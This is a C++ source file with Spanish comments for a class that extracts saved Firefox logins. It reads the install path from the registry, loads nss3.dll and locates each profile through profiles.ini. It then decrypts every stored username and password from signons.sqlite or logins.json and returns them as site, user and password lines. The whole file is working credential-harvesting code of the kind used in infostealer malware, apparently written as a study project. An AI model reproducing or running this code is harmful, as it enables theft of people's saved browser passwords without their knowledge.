#include "Firefox.h"
#include "Recursos.h"
#include "json.hpp"
using json = nlohmann::json;

#define NOMINMAX
#define PRBool   int
#define PRUint32 unsigned int
#define PR_TRUE  1
#define PR_FALSE 0
#define SQLITE_OK 0
#define SQLITE_ROW 100
#define SQLITE_API

char g_ver[20];



typedef enum SECItemType {
	siBuffer = 0,
	siClearDataBuffer = 1,
	siCipherDataBuffer,
	siDERCertBuffer,
	siEncodedCertBuffer,
	siDERNameBuffer,
	siEncodedNameBuffer,
	siAsciiNameString,
	siAsciiString,
	siDEROID,
	siUnsignedInteger,
	siUTCTime,
	siGeneralizedTime
};

struct SECItem {
	SECItemType type;
	unsigned char* data;
	size_t len;
};

typedef enum SECStatus {
	SECWouldBlock = -2,
	SECFailure = -1,
	SECSuccess = 0
};


typedef struct PK11SlotInfoStr PK11SlotInfo; 
typedef SECStatus(*NSS_Init) (const char*);
typedef SECStatus(*NSS_Shutdown) (void);
typedef PK11SlotInfo* (*PK11_GetInternalKeySlot) (void);
typedef void(*PK11_FreeSlot) (PK11SlotInfo*);
typedef SECStatus(*PK11_Authenticate) (PK11SlotInfo*, PRBool, void*);
typedef SECStatus(*PK11SDR_Decrypt) (SECItem*, SECItem*, void*);


PK11_GetInternalKeySlot PK11GetInternalKeySlot;
PK11_FreeSlot           PK11FreeSlot;
PK11_Authenticate       PK11Authenticate;
PK11SDR_Decrypt         PK11SDRDecrypt;
NSS_Init                fpNSS_INIT;
NSS_Shutdown            fpNSS_Shutdown;



Firefox::Firefox()
{
}


Firefox::~Firefox()
{
}
/*

porque _strnicmp lleva _ delante del nombre: Failing that, a large number of historic C library implementations have the functions stricmp() and strnicmp(). Visual C++ on Windows renamed all of these by prefixing them with an underscore because they aren’t part of the ANSI standard

*/

char* Firefox::rutaInstalado() {
	Recursos recursos;
	// devuelve la ruta donde está instalado firefox
	char value[MAX_PATH];
	DWORD cbSize;
	cbSize = MAX_PATH;
	char* path = "SOFTWARE\\Mozilla\\Mozilla Firefox";
	if (!SHGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Mozilla\\Mozilla Firefox", "CurrentVersion", 0, value, &cbSize)) {
		// devuelve el valor de registro 'CurrentVersion' de la clave SOFTWARE\\Mozilla\\Mozilla Firefox en la clave raiz HKEY_LOCAL_MACHINE
		path = recursos.dupcat(path, "\\", value, "\\Main", 0);

		strcpy(g_ver, value);
		//printf("[+] Firefox version %s\n", g_ver);
		cbSize = MAX_PATH;
		/*

			a partir de conseguir la versión instalada se consigue la siguiente clave:
			HKEY_LOCAL_MACHINE\SOFTWARE\Mozilla\Mozilla Firefox\66.0.3 (x64 es-ES)\Main
			y a partir de el valor 'Install Directory' que contiene esta clave se saca el directorio donde está instalado

			se necesita el directorio donde está instalado firefox porque en el se encuentra la .dll 
			que utilizaremos para poder descifrar los logins.

		*/
		if (!SHGetValue(HKEY_LOCAL_MACHINE, path, "Install Directory", 0, value, &cbSize)) {
			int size = strlen(value) + 1;
			char* ret = (char*)calloc(size, 1);
			memcpy(ret, value, size);
			delete[]path;
			return ret;
		}
	}
	return 0;
}

BOOL  Firefox::loadFunctions(char* installPath) {
	Recursos recursos;
	if (installPath) {

		char* path = getenv("PATH");
		if (path) {
			char* newPath = recursos.dupcat(path, ";", installPath, 0);
			_putenv(recursos.dupcat("PATH=", newPath, 0));
			delete[]newPath;
		}

		/*
		
		Si se desea, la clase puede tratar los certificados que se encuentran en dispositivos PKCS#11 y que han sido configurados 
		como dispositivos de seguridad en Firefox. Esta solución es una buena idea en sistemas 
		Linux donde no se dispone del almacén de Windows para gestionar los certificados en tarjeta.

		*/

		HMODULE hNSS = LoadLibrary((recursos.dupcat(installPath, "\\nss3.dll", 0)));
		/*
			LoadLibrary carga la DLL a memoria del proceso 

			NSS: es un conjunto de librerías diseñadas para soportar el desarrollo multiplataforma 
			de aplicaciones cliente y servidor habilitadas para la seguridad.
		
		*/
		

		if (hNSS) {
			// cargar funciones de la libreria nss3.dll
			// cargar dinamicamente funciones de una dll

			fpNSS_INIT = (NSS_Init)GetProcAddress(hNSS, "NSS_Init");
			// GetProcAddress obtiene la dirección de memoria de la función 'NSS_Init' de la DLL nss3.dll que se ha cargado en la memoria del proceso
			// además anteriormente se tiene que haber definido typedef SECStatus(*NSS_Init) (const char*);
			// NSS_Init incializa Network Security Services (NSS) 
			fpNSS_Shutdown = (NSS_Shutdown)GetProcAddress(hNSS, "NSS_Shutdown");
			PK11GetInternalKeySlot = (PK11_GetInternalKeySlot)GetProcAddress(hNSS, "PK11_GetInternalKeySlot");
			PK11FreeSlot = (PK11_FreeSlot)GetProcAddress(hNSS, "PK11_FreeSlot");
			PK11Authenticate = (PK11_Authenticate)GetProcAddress(hNSS, "PK11_Authenticate");
			PK11SDRDecrypt = (PK11SDR_Decrypt)GetProcAddress(hNSS, "PK11SDR_Decrypt");
			//  descifrar datos previamente encriptados con PK11SDR_Encrypt el resultado debe ser liberado con SECItem_ZfreeItem

			//captura código firefox descifrar contraseñas: https://hg.mozilla.org/mozilla-central/file/7d3d1c2c75f8/security/manager/ssl/src/nsSDR.cpp#l249

		}
		return !(!fpNSS_INIT || !fpNSS_Shutdown || !PK11GetInternalKeySlot || !PK11Authenticate || !PK11SDRDecrypt || !PK11FreeSlot);
	}
	return FALSE;
}

char* Firefox::descifrar(const char* s) {
	BYTE byteData[8096];
	DWORD dwLength = 8096;
	PK11SlotInfo* slot = 0;
	SECStatus status;
	SECItem in, out;
	char* result = "";

	ZeroMemory(byteData, sizeof(byteData));
	// rellena un bloque de memoria con ceros (Windows API)
	if (CryptStringToBinary(s, strlen(s), CRYPT_STRING_BASE64, byteData, &dwLength, 0, 0)) {
		// CryptStringToBinary convierte un array de bytes a una string 
		slot = (*PK11GetInternalKeySlot) ();
		if (slot != NULL) {
			status = PK11Authenticate(slot, PR_TRUE, NULL);
			if (status == SECSuccess) {
				in.data = byteData;
				in.len = dwLength;
				out.data = 0;
				out.len = 0;
				status = (*PK11SDRDecrypt) (&in, &out, NULL);
				if (status == SECSuccess) {
					memcpy(byteData, out.data, out.len);
					byteData[out.len] = 0;
					result = ((char*)byteData);
				}
				else
					result = "error al descifrar";
			}
			else
				result = "error al autentificarse nss";
			(*PK11FreeSlot) (slot);
		}
		else {
			result = "error PK11GetInternalKeySlot";

		}
	}

	return result;
}

char*  Firefox::getContraseñas() {
	char path[MAX_PATH];
	char appData[MAX_PATH], profile[MAX_PATH];
	char sections[4096];
	string info= "------------------------- Mozilla Firefox ------------------------- \n"; 
	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, appData);
	// CSIDL_APPDATA -> <user name>\Application Data


	_snprintf(path, sizeof(path), "%s\\Mozilla\\Firefox\\profiles.ini", appData);
	//_snprintf guarda en path con el mismo formato con el que haría un printf en este caso pondrá appData en %s

	GetPrivateProfileSectionNames(sections, 4096, path);
	// devuelve el nombre de todas las secciones de un fichero .ini en este caso profiles.ini

	char* p = sections;
	/*cout << "Sections: profile.ini " + string(p) << endl;
	cout << "Llega hasta sections" << endl;*/

	while (1) {

		if (_strnicmp(p, "Profile", 7) == 0) {
			// devuelve 0 si los primeros 7 caracteres de p son iguales a los primeros de Profile (en este caso es que las dos cadenas sean iguales)
			// al parecer no distingue entre mayuscula y minuscula porque el contenido de p es: 'profile.ini General'
		
			//std::cout << path << endl;

			GetPrivateProfileString(p, "Path", NULL, profile, MAX_PATH, path);
			// lee el campo Path del profiles.ini donde se encuentra signons.sqlite o logins.json (dependiendo de la versión)

			//cout << profile << endl;
			// Profiles/7s6c0u5y.default

			//cout << std::string(profile).find_first_of("/") + 1 << endl;
			// std::string(profile).find_first_of("/") + 1 obtiene el primer caracter despues de '/'

			//cout << std::string(profile).substr(std::string(profile).find_first_of("/") + 1).c_str() << endl;
			// substr() crea un nuevo string desde una posición hasta el final si no se especifica una longitud 
			// de esta manera se obtiene el contenido restante de la cadena después del '/'

			_snprintf(path, sizeof(path), "%s\\Mozilla\\Firefox\\Profiles\\%s", appData, std::string(profile).substr(std::string(profile).find_first_of("/") + 1).c_str());
			Recursos recursos;
			if (!(*fpNSS_INIT) (path)) {
				int ver = atoi(g_ver);
				if (ver < 32) { // la versión 32 se publicó 26/08/2014
					char* database = recursos.dupcat(path, "\\signons.sqlite", 0);

					int nContraseñas = 0;
					sqlite3* db;
					if (sqlite3_open(database, &db) == SQLITE_OK) {
						sqlite3_stmt* stmt;
						char* query = "SELECT encryptedUsername, encryptedPassword, formSubmitURL FROM moz_logins";
						if (sqlite3_prepare_v2(db, query, -1, &stmt, 0) == SQLITE_OK) {

							while (sqlite3_step(stmt) == SQLITE_ROW) {
								char* usuario, * contraseña, * web;
								usuario = (char*)sqlite3_column_text(stmt, 0);
								contraseña = (char*)sqlite3_column_text(stmt, 1);
								web = (char*)sqlite3_column_text(stmt, 2);
								nContraseñas++;

								std::cout << string(web) +  " | "  + string(descifrar(usuario)) + " | " + string(descifrar(contraseña)) << endl;
							}
							delete[]database;
						}
						else
							cout << "No se puede abrir base de datos" << endl;
					}
					else
						cout << "No se puede abrir base de datos" << endl;
					if (nContraseñas == 0)
						cout << "No se han encontrado contraseñas en la base de datos" << endl;
				}
				else {
					// a partir de la versión 32 firefox utiliza un archivo logins.json para almacenar las contraseñas guardadas en el navegador

					char* jsonfile = recursos.dupcat(path, "\\logins.json", 0);
					//C:\Users\IEUser\AppData\Roaming\Mozilla\Firefox\Profiles\7s6c0u5y.default\logins.json
					// se añade \\logins.json al directorio obtenido a partir del profiles.ini

					int nContraseñas = 0;
					json j;
					std::ifstream ifs(jsonfile);
					if (ifs.is_open()) {
						ifs >> j;
						if (j.find("logins") != j.end()) {
							json logins = j["logins"];
							int len = logins.size();
							nContraseñas = len;
							int i = 0;
							for (int i = 0; i < len; i++)
							{
								string usuarioCifrado = logins[i]["encryptedUsername"].dump();
								string contraseñaCifrada = logins[i]["encryptedPassword"].dump();
								string web = logins[i]["hostname"].dump();
								// pasar de el dato del json a string

								usuarioCifrado.erase(std::remove(usuarioCifrado.begin(), usuarioCifrado.end(), '"'), usuarioCifrado.end());
								contraseñaCifrada.erase(std::remove(contraseñaCifrada.begin(), contraseñaCifrada.end(), '"'), contraseñaCifrada.end());
								web.erase(std::remove(web.begin(), web.end(), '"'), web.end());
								// string que se obtiene de el json aún tiene " con esta función eliminamos todas las apariciones de " en el string
								// si se dejan las " la función de descifrar no lo descifra correctamente
								
								string usuario = descifrar(usuarioCifrado.c_str());
								string contraseña = descifrar(contraseñaCifrada.c_str());

								//cout << web + " | " + usuario + " | " + contraseña << endl;
								info += web + " | " + usuario + " | " + contraseña + " \n";
							}

						}
							
					}
					ifs.close();
				if (nContraseñas == 0)
					cout << "no se han encontrado contraseñas en logins.json" << endl;
				}
				(*fpNSS_Shutdown) ();
			} else {
				cout << " error NSS_Init()" << endl;
			}
		}
		p += lstrlen(p) + 1;
		if (p[0] == 0) break;
	}
	//Return char* limpio
	char* info_char = &info[0u];
	int size = strlen(info_char) + 1;
	char* ret = (char*)calloc(size, 1);
	memcpy(ret, info_char, size);
	return ret;
}